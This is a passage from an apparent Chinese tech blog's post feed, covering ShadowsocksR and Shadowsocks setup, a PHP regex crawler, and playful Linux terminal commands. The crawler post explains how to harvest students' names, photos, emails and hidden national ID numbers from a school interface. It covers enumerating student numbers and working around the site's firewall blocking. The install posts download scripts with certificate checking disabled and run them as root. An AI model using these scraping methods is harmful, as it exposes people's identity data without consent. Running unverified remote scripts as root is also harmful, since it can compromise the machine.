class="code"><pre><span class="line">pip install cymysql</span><br></pre></td></tr></table></figure><h3 id="2-3、获取ShadowsocksR源代码"><a href="#2-3、获取ShadowsocksR源代码" class="headerlink" title="2.3、获取ShadowsocksR源代码"></a>2.3、获取ShadowsocksR源代码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b manyuser https://github.com/breakwa11/shadowsocks.git</span><br></pre></td></tr></table></figure><p>执行完毕后此目录会新建一个shadowsocks目录，其中根目录(当前目录)的是多用户版（用户数据存放在数据库中），子目录(当前目录下的shadowsocks目录)中的是单用户版(用户数据存放在文件中)。</p><h3 id="2-4、服务端配置"><a href="#2-4、服务端配置" class="headerlink" title="2.4、服务端配置"></a>2.4、服务端配置</h3><p>在多用户版的根目录中，复制<code>mysql.json</code>文件为<code>usermysql.json</code>，然后修改<code>usermysql.json</code>并找到对应的信息栏目(一定要记住!!!)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> mysql.json usermysql.json</span><br><span class="line">vi usermysql.json</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, //前端mysql域名/IP</span><br><span class="line"><span class="string">&quot;port&quot;</span>: 3306, //mysql端口</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;ss&quot;</span>, //mysql用户名</span><br><span class="line"><span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>, //mysql密码</span><br><span class="line"><span class="string">&quot;db&quot;</span>: <span class="string">&quot;shadowsocks&quot;</span>, //数据库名</span><br></pre></td></tr></table></figure><h3 id="2-5、配置文件config-json"><a href="#2-5、配置文件config-json" class="headerlink" title="2.5、配置文件config.json"></a>2.5、配置文件config.json</h3><p>在多用户版的根目录将文件config.json复制一份到user-config.json，然后编辑：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> config.json user-config.json</span><br><span class="line">vi user-config.json</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;method&quot;</span>:<span class="string">&quot;aes-256-cfb&quot;</span>, //修改成您要的加密方式的名称</span><br><span class="line"><span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_sha1_compatible&quot;</span>, //修改成您要的协议插件名称</span><br><span class="line"><span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;tls1.0_session_auth_compatible&quot;</span>, //修改成您要的混淆插件名称</span><br></pre></td></tr></table></figure><blockquote><p>本文的主要内容来源于<a href="https://www.dou-bi.co/ss-jc30/">逗比根据地</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Shadowsocks </tag>
            
            <tag> SS-Panel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP与正则爬虫实践</title>
      <link href="/2016/01/26/php-regular/"/>
      <url>/2016/01/26/php-regular/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>之前听说过我们学校有一个学生信息的接口，最近这几天闲来无事，打算用PHP做一个爬虫，爬一下数据。由于我对数据的情有独钟，因此，弄完后打算写个文章记录下我的过程，也算是温习一下（这其中有个小插曲：本来我都写完了，可是因手贱原因，重新安装系统了，又手贱把D盘的一些软件全删了，重新安了一遍，结果把写好的爬虫文件删除了。。。。。。尝试用Recuva软件恢复，可是还是没恢复成功，没办法了，周六中午10点又写了一遍，两个小时吧，才弄好。。。真是累呀~~~~~）。推荐几个关于正则表达式的链接：<a href="http://tool.lu/regex/" target="_blank"></i>正则表达式在线工具</a> —-<a href="http://www.jb51.net/shouce/jquery1.82/regexp.html" target="_blank">正则表达式速查表</a>—-<a href="http://www.yiifcms.com/soft/9/" target="_blank">下载正则表达式CHM</a></p><h2 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h2><p>这里只用PHP写了爬虫，毕竟其他的我也不会。考虑到需要使用正则，因此我又去温习了一遍正则，网上有很多正则学习的地方，这里就不举例了。因为我是爬的校园内的接口，因此我会隐去网址的一部分。</p><p>首先需要获取目标网址，下面 <code>$url</code> 为目标地址，<code>$num</code> 为学号，这个接口是使用学号查询的，因此把学号弄成变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>.<span class="variable">$num</span>);</span><br><span class="line"><span class="variable">$html</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r&quot;</span>,<span class="string">&quot;/n&quot;</span>,<span class="string">&quot;/t&quot;</span>,<span class="string">&quot;/s&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$html</span>);</span><br></pre></td></tr></table></figure><p>为了获取该网页中的数据信息，必须对存储着网页代码的$html文件进行正则查询，因此：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&lt;div[^&gt;]*&gt;(.*?)&lt;\/div&gt;/si&#x27;</span>,<span class="variable">$html</span>,<span class="variable">$match</span>);</span><br></pre></td></tr></table></figure><p>然后我们通过 <code>print_r($match);</code> 会发现，<code>$match</code> 为一个二维数组，其中一个数组中存储着匹配的所有数据，包括学生姓名，性别，学号，学院，校园邮箱，其实还有一个隐藏的信息，那就是身份证号，通过查看网页源代码可以发现，但是 <code>$match</code> 数组中并没有这个数据，为止，我们可以使用下面的代码正则匹配身份证号码，其中$html为保存的网页源码变量，将匹配的身份证号码存入 <code>$idcard</code> ，但是如果想要输出身份证号码的话，要echo $idcard[0];</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d&#123;18&#125;|\d&#123;17&#125;[0-9Xx]/&#x27;</span>,<span class="variable">$html</span>,<span class="variable">$idcard</span>);</span><br></pre></td></tr></table></figure><p>还有，注意看的话，<code>$match</code> 数组中还没有学生图片的 <code>src</code> 地址，为此我们需要分析网页源码，发现只有一个 <code>img</code> 标签，那就好办了，直接利用下面的正则代码，获取 <code>src</code> ,使用 <code>echo $link[1];</code> 输出图片链接地址，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;[img|IMG].*?src=[\&#x27;|\&quot;](.*?(?:[\.gif|\.jpg]))[\&#x27;|\&quot;].*?[\/]?&gt;/&#x27;</span>,<span class="variable">$html</span>,<span class="variable">$link</span>);</span><br></pre></td></tr></table></figure><p>这里输出的图片地址为相对地址，为了正常访问需要在前面加上前缀，具体前缀，可以在网页源码中点击图片链接后查看。</p><p>这样，图片地址，学号，姓名，学院，年级，身份证号都可以打印出来了，为了方便建议新建数组，存放这些信息。</p><h2 id="三、一些问题"><a href="#三、一些问题" class="headerlink" title="三、一些问题"></a>三、一些问题</h2><p>我在爬的过程中遇到很多小问题，下面具体说一说：</p><ul><li><p>要看清 <code>$match</code> 数组中哪些是自己需要的信息，不要弄错了。</p></li><li><p>这里是查询一个人的信息，如果多人可以弄个 <code>while(1)</code> 的循环。</p></li><li><p>查询完毕后可以把数据存入数据库或者本地文件，不过建议本地文件，毕竟这样会效率快一些。为了方便导入数据库，在存入文件时需要做一些必要的格式化处理，比如，学生的各个信息之间使用 <code>Tab</code> 分割，一个学生数据存入后，录入文件中一个回车符，这样也可以方便导入数据库。</p></li><li><p>因为学号的命名规则，前四位代表入学年份，接着两位代表学院编码，接着两位为专业编码，接着三位为专业内自己的编号，如果要是之间不作处理从最开始到最后的话，会浪费很多无用的时间，并且专业内人员的人数大多数都不会超过 <code>500</code> 人，这样每一千里面就会浪费 <code>500</code> 数据的查询时间，建议：先爬一下学院与专业的这四位数组成的学号末尾为 <code>001</code> 的数据，本地记录下，这样在进行爬虫时会节省不少时间，并且如果查询时连续出现 <code>50</code> 个空白数据，然后跳转到下一个专业或者学院代码继续爬，节省时间，等等其他方法。</p></li><li><p>注意有的学生的查询页中没有隐藏的身份证信息，这样就需要自己加个判断条件，防止写入文件时格式乱了，不利于录入数据库。</p></li><li><p>该接口使用了安全狗的检测功能，如果频繁查询，系统会屏蔽一段时间，不过这也就是 <code>10</code> 分钟左右的事，这也是需要考虑的，要知道，屏蔽后也会出现界面，这样程序在这个页面捕捉的信息也会写入文件，需要加个判断，比如，个人信息查询界面存在邮箱格式，而安全狗提示界面没有邮箱信息，可以用正则验证是否有邮箱信息，如果有的话，那就 <code>10</code> 分钟之后再试，并且不将获得的数据写入文件。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shadowsocks一键安装脚本</title>
      <link href="/2016/01/23/shadowsocks-script/"/>
      <url>/2016/01/23/shadowsocks-script/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Shadowsocks介绍"><a href="#一、Shadowsocks介绍" class="headerlink" title="一、Shadowsocks介绍"></a>一、Shadowsocks介绍</h2><p>Shadowsocks（中文名称：影梭）是使用Python等语言开发的、基于Apache许可证开源的代理软件。Shadowsocks使用socks5代理，用于保护网络流量。Shadowsocks分为服务器端和客户端。在使用之前，需要先将服务器端部署在支持Python等的服务器上面，然后通过客户端连接并创建本地代理。此外用户也可以选择购买基于Shadowsocks的商业服务，以获得更加稳定可靠的服务，或者免去自行部署的麻烦。目前开发者Clowwindy由于一些原因已宣布停止维护，shadowsocksR 的作者已表示会继续开发新版本。</p><p>对于想要使用SS的用户来说，相比在网路上买一些月供几十的SS服务商的出售的SS账户，自己倒不如买个便宜点的VPS自己构建一个SS服务器，为防止VPS资源过剩，自己也可以干点别的事情，这里给出了使用三种语言搭建SS服务器的一键安装脚本，供大家使用。</p><h2 id="二、Python一键脚本"><a href="#二、Python一键脚本" class="headerlink" title="二、Python一键脚本"></a>二、Python一键脚本</h2><ol><li><p>适用条件：系统为CentOS 6，7，Debian，Ubuntu 、内存≥128M</p></li><li><p>配置：服务器端口默认为8585 ，客户端端口为1080 ，密码默认为password</p></li><li><p>一键脚本（使用root用户）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/CUBEGWZ/Shadowsocks/master/Python/shadowsocks.sh</span><br><span class="line"><span class="built_in">chmod</span> +x shadowsocks.sh</span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | <span class="built_in">tee</span> shadowsocks.log</span><br></pre></td></tr></table></figure></li><li><p>卸载与其他配置：<br>  卸载方式： <code>./shadowsocks.sh uninstall</code></p></li></ol><ul><li>单用户配置文件 Sample：<br> 配置文件路径：<code>/etc/shadowsocks.json</code></li></ul>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;server&quot;</span>:<span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;server_port&quot;</span>:8585,</span><br><span class="line">    <span class="string">&quot;local_address&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local_port&quot;</span>:1080,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span>:300,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>:<span class="string">&quot;aes-256-cfb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>多用户多端口配置文件 Sample：<br> 配置文件路径：<code>/etc/shadowsocks.json</code></li></ul>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;server&quot;</span>:<span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local_address&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local_port&quot;</span>:1080,</span><br><span class="line">    <span class="string">&quot;port_password&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;8585&quot;</span>:<span class="string">&quot;password0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9001&quot;</span>:<span class="string">&quot;password1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9002&quot;</span>:<span class="string">&quot;password2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9003&quot;</span>:<span class="string">&quot;password3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9004&quot;</span>:<span class="string">&quot;password4&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span>:300,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>:<span class="string">&quot;aes-256-cfb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、GO一键脚本"><a href="#三、GO一键脚本" class="headerlink" title="三、GO一键脚本"></a>三、GO一键脚本</h2><ol><li><p>适用条件：系统为CentOS，Debian，Ubuntu 、内存≥128M</p></li><li><p>配置：服务器端口默认为8585 ，客户端端口为1080 ，密码默认为password</p></li><li><p>一键脚本（使用root用户）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/CUBEGWZ/Shadowsocks/master/Go/shadowsocks-go.sh</span><br><span class="line"><span class="built_in">chmod</span> +x shadowsocks-go.sh</span><br><span class="line">./shadowsocks-go.sh 2&gt;&amp;1 | <span class="built_in">tee</span> shadowsocks-go.log</span><br></pre></td></tr></table></figure></li><li><p>卸载与其他配置：<br>  卸载方式： <code>./shadowsocks-go.sh uninstall</code></p></li></ol><ul><li>多用户多端口配置文件 Sample：<br> 配置文件路径：<code>/etc/shadowsocks.json</code></li></ul>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;port_password&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;8585&quot;</span>:<span class="string">&quot;password0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9001&quot;</span>:<span class="string">&quot;password1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9002&quot;</span>:<span class="string">&quot;password2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9003&quot;</span>:<span class="string">&quot;password3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9004&quot;</span>:<span class="string">&quot;password4&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>:<span class="string">&quot;aes-256-cfb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span>:600</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、Libev一键脚本"><a href="#四、Libev一键脚本" class="headerlink" title="四、Libev一键脚本"></a>四、Libev一键脚本</h2><ol><li><p>适用条件：系统为CentOS 32或64位、内存≥128M</p></li><li><p>配置：服务器端口默认为8585 ，客户端端口为1080 ，密码默认为password</p></li><li><p>一键脚本（使用root用户）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/CUBEGWZ/Shadowsocks/master/Libev/shadowsocks-libev.sh</span><br><span class="line"><span class="built_in">chmod</span> +x shadowsocks-libev.sh</span><br></pre></td></tr></table></figure></li><li><p>卸载与其他配置：<br>  卸载方式： <code>./shadowsocks-libev.sh uninstall</code></p></li></ol><ul><li><p>修改配置文件 <code>/etc/shadowsocks-libev/config.json</code>,同时启用 IPv4 与 IPv6 支持：</p>   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;server&quot;</span>:[<span class="string">&quot;[::0]&quot;</span>,<span class="string">&quot;0.0.0.0&quot;</span>],</span><br><span class="line">    <span class="string">&quot;server_port&quot;</span>:your_server_port,</span><br><span class="line">    <span class="string">&quot;local_address&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local_port&quot;</span>:1080,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span>:600,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>:<span class="string">&quot;aes-256-cfb&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="五、Shadowsocks操作命令"><a href="#五、Shadowsocks操作命令" class="headerlink" title="五、Shadowsocks操作命令"></a>五、Shadowsocks操作命令</h2><ul><li>启动：<code>/etc/init.d/shadowsocks start</code></li><li>停止：<code>/etc/init.d/shadowsocks stop</code></li><li>重启：<code>/etc/init.d/shadowsocks restart</code></li><li>状态：<code>/etc/init.d/shadowsocks status</code></li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下有趣的东西</title>
      <link href="/2016/01/22/linux-interesting/"/>
      <url>/2016/01/22/linux-interesting/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Linux就是一个高大上的系统，如果你习惯使用Linux的Shell方式，而不是经常用Linux的界面形式，那你一定会学到更多东西，更能体会在门外汉看起来的高大上，但是，不要以为命令行的形式有多么枯燥，命令行中也有很多有意思的东西哦，话不多说，直入主题。</p><h3 id="1-1、可爱的小火车sl"><a href="#1-1、可爱的小火车sl" class="headerlink" title="1.1、可爱的小火车sl"></a>1.1、可爱的小火车<code>sl</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install sl</span><br></pre></td></tr></table></figure><p>当输入<code>sl</code>时就会有小火车路过哦!输入<code>sl -l</code>会出现加长版的小火车，输入<code>sl -F</code>就会出现晃动的小火车<br>再来个晃动的小火车：<br>其实，这个也可以用来恶搞别人，如果你输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> <span class="built_in">ls</span>=sl</span><br></pre></td></tr></table></figure><p>因为<code>ls</code>是<code>Linux命令</code>中比较频繁的使用命令之一，当别人是输入<code>ls</code>的时候，小火车就出现了。。。</p><h3 id="1-2、程序猿的愤怒yes"><a href="#1-2、程序猿的愤怒yes" class="headerlink" title="1.2、程序猿的愤怒yes"></a>1.2、程序猿的愤怒<code>yes</code></h3><p>这个不需要安装什么东西，直接输入<code>yes</code>，然后回车，系统上面就会不断出现y，想停止的话，按<kbd>ctrl+z</kbd>。</p><h3 id="1-3、会说话的ASCII动物cowsay-cowthink"><a href="#1-3、会说话的ASCII动物cowsay-cowthink" class="headerlink" title="1.3、会说话的ASCII动物cowsay/cowthink"></a>1.3、会说话的ASCII动物<code>cowsay/cowthink</code></h3><p>首先需要安装<code>cowsay</code>,输入下面命令进行安装：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install cowsay</span><br></pre></td></tr></table></figure><p>安装后，当我们输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowsay hello everyone！</span><br></pre></td></tr></table></figure><p>就出现了，一头会说话的奶牛（它说的话就是我们指定的内容）;也可以用下面的命令输出：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowthink hello everyone!</span><br></pre></td></tr></table></figure><p>其实不光可以用<code>cow</code>(奶牛)，也可以用其他的动物，你可以使用下面命令，查看可以使用的动物,下图有实例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowsay -l</span><br></pre></td></tr></table></figure><p>使用的话，代码如下(<code>name</code>为动物名称；<code>words</code>为动物要说的内容)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowsay -f name words</span><br></pre></td></tr></table></figure><p>还可以使用这段代码，这样每次说话的动物都不同（下图有实例）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowsay -f <span class="string">&quot;<span class="subst">$(ls /usr/share/cowsay/cows | sort -R | head -1)</span>&quot;</span> hello everyone!</span><br></pre></td></tr></table></figure><h3 id="1-4、随机输出一句话fortune"><a href="#1-4、随机输出一句话fortune" class="headerlink" title="1.4、随机输出一句话fortune"></a>1.4、随机输出一句话<code>fortune</code></h3><p>如果仅安装上<code>fortune</code>就可以输出一句英文名言，或者英文的一句话，如果再安装上<code>fortune-zh</code>就可以使用fortune输出英文的和中文的，输出中文的是古诗词。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fortune</span><br><span class="line">sudo apt-get install fortune-zh</span><br></pre></td></tr></table></figure><p>如果想输出一句话，直接使用<code>fortune</code>输出即可。<br>另一个有意思的方法是和<code>cowsay</code>结合起来的话，代码为:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fortune | cowsay</span><br></pre></td></tr></table></figure><p>也可以使用随机动物输出一句话，代码为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowsay -f <span class="string">&quot;<span class="subst">$(ls /usr/share/cowsay/cows | sort -R | head -1)</span>&quot;</span> <span class="string">&quot;<span class="subst">$(fortune -s)</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="1-5、让字符变为彩色的lolcat"><a href="#1-5、让字符变为彩色的lolcat" class="headerlink" title="1.5、让字符变为彩色的lolcat"></a>1.5、让字符变为彩色的<code>lolcat</code></h3><p>我们需要安装名为<code>lolcat</code>的软件，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install lolcat</span><br></pre></td></tr></table></figure><p>安装完成之后，可以与前面讲的<code>fortune</code>结合使用，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fortune | lolcat</span><br></pre></td></tr></table></figure><p>这两个小软件还可以与<code>cowsay</code>结合使用，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cowsay -f <span class="string">&quot;<span class="subst">$(ls /usr/share/cowsay/cows | sort -R | head -1)</span>&quot;</span> <span class="string">&quot;<span class="subst">$(fortune -s)</span>&quot;</span> | lolcat</span><br></pre></td></tr></table></figure><h3 id="1-6、用符号拼凑字母banner和figlet"><a href="#1-6、用符号拼凑字母banner和figlet" class="headerlink" title="1.6、用符号拼凑字母banner和figlet"></a>1.6、用符号拼凑字母<code>banner</code>和<code>figlet</code></h3><p>首先我们安装<code>bnner</code>：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install sysvbanner</span><br></pre></td></tr></table></figure><p>然后我们可以直接输入<code>banner</code>进行使用。<br>然后我们来安装<code>figlet</code>，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install figlet</span><br></pre></td></tr></table></figure><p>然后我们可以直接输入<code>figlet</code>进行使用。<br>可以看出，这两个拼的样式不同的哈~个人比较喜欢后面的~~~~~</p><h3 id="1-7、终端上网w3m"><a href="#1-7、终端上网w3m" class="headerlink" title="1.7、终端上网w3m"></a>1.7、终端上网<code>w3m</code></h3><p>因为我用的是服务器环境，虽然说我都是SSH它，浏览信息都在我本地电脑上，可是真有个终端上网的工具，相信用处还是挺大的。安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install w3m w3m-img</span><br></pre></td></tr></table></figure><p>如果只是用来上个网，直接使用下面的代码，下面有实例（浏览时图片显示不出来，因为我用的server版本），如果想看别的<code>options</code>，直接<code>help</code>查看一下（想要退出的话，按<kbd>ctrl+z</kbd>）；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w3m cn.bing.com</span><br></pre></td></tr></table></figure><h3 id="1-8、屏幕录制script-amp-scriptreplay"><a href="#1-8、屏幕录制script-amp-scriptreplay" class="headerlink" title="1.8、屏幕录制script&amp;scriptreplay"></a>1.8、屏幕录制<code>script</code>&amp;<code>scriptreplay</code></h3><p>使用<code>script</code>命令可是将你在屏幕上的操作录制下来（结束录制的话，输入<code>exit</code>并<kbd>回车</kbd>）。使用<code>scriptreplay</code>可以查看你的录制。<br>使用下面的代码开始录制（实例如下）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">script -t 2&gt;example.time -a example.txt</span><br></pre></td></tr></table></figure><p>注解上面的代码：</p><ol><li><code>-t</code> 是把时间数据输出到标准错误<code>(standard error)</code>，所以这里使用<code>2&gt;example.time</code>把数据转向到<code>example.txt</code>这个文件当中。</li><li><code>-a</code>选项是指定输出录制的文件</li></ol><p>输入<code>exit</code>并按<kbd>回车</kbd>来结束录制。<br>查看录制的代码的代码为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scriptreplay example.time example.txt</span><br></pre></td></tr></table></figure><h3 id="1-9、显示logo的linuxlogo"><a href="#1-9、显示logo的linuxlogo" class="headerlink" title="1.9、显示logo的linuxlogo"></a>1.9、显示logo的<code>linuxlogo</code></h3><p><code>linuxlogo</code>(或<code>linux_logo</code>)是一款在<code>Linux</code>命令行下用彩色 ANSI 代码生成附带有系统信息的发行版徽标的工具。</p><p>首先安装这个小工具：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linuxlogo</span><br></pre></td></tr></table></figure><p>安装完成后，我们可以使用<code>linuxlogo</code>命令查看你当前使用的发行版的默认徽标,我们可以查看它的<code>help</code>，里面有很多<code>options</code>，这里只介绍一些：<br>输入下面的代码表示仅输出徽标而不包含系统信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">linuxlogo -l</span><br></pre></td></tr></table></figure><p>输入下面的代码表示输出灰色的信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">linuxlogo -a</span><br></pre></td></tr></table></figure><p>其实这个工具内部还有很多徽标，你可以使用 <code>[-L list]</code> 选项查看在这些徽标的列表，代码及实例如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">linuxlogo -L list</span><br></pre></td></tr></table></figure><p>关于这个小工具更详细的介绍，大家可以去 <a href="https://linux.cn/article-5838-1.html">这里</a></p><h3 id="1-10、分解因数factor"><a href="#1-10、分解因数factor" class="headerlink" title="1.10、分解因数factor"></a>1.10、分解因数<code>factor</code></h3><p><code>factor</code>不需要安装，可以直接使用，代码格式如下(number可以为任意整数):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">factor</span> number</span><br></pre></td></tr></table></figure><h3 id="1-11、屏保cmatrix"><a href="#1-11、屏保cmatrix" class="headerlink" title="1.11、屏保cmatrix"></a>1.11、屏保<code>cmatrix</code></h3><p>从上往下不断的输出字符串，和很多黑客电影中的场景差不多，估计那些电影也是用的这个吧.安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install cmatrix</span><br></pre></td></tr></table></figure><p>启动代码为<code>cmatrix</code>,退出的话直接<kbd>ctrl+z</kbd>即可。</p><h3 id="1-12、屏幕燃烧aafire"><a href="#1-12、屏幕燃烧aafire" class="headerlink" title="1.12、屏幕燃烧aafire"></a>1.12、屏幕燃烧<code>aafire</code></h3><p>该命令会输出由<code>ASCII</code>组成的字符，创造仿佛屏幕燃烧的效果。下面是安装，启动代码及实例：<br>安装代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libaa-bin</span><br></pre></td></tr></table></figure><p>启动代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aafire</span><br></pre></td></tr></table></figure><h3 id="1-13、输出艺术字toilet"><a href="#1-13、输出艺术字toilet" class="headerlink" title="1.13、输出艺术字toilet"></a>1.13、输出艺术字<code>toilet</code></h3><p>还是由ASCII组成的艺术字。安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install toilet</span><br></pre></td></tr></table></figure><h3 id="1-14、不一样的音乐播放器bb"><a href="#1-14、不一样的音乐播放器bb" class="headerlink" title="1.14、不一样的音乐播放器bb"></a>1.14、不一样的音乐播放器<code>bb</code></h3><p>安装代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install bb</span><br></pre></td></tr></table></figure><p>启动代码(这款软件是有声音的哦!)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bb</span><br></pre></td></tr></table></figure><h3 id="1-15、观看星球大战telnet"><a href="#1-15、观看星球大战telnet" class="headerlink" title="1.15、观看星球大战telnet"></a>1.15、观看星球大战<code>telnet</code></h3><p>telnet是基于Telnet协议的远程登陆客户端程序，经常用来远程登录服务器，但是现在，我们却用它来看星球大阵，哈哈哈~</p><p>观看命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet towel.blinkenlights.nl</span><br></pre></td></tr></table></figure><p>这个有点长，并且，我好像不知道怎么退出去了。。。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd搭建FTP服务器</title>
      <link href="/2016/01/22/vsftpd-ftp/"/>
      <url>/2016/01/22/vsftpd-ftp/</url>
      
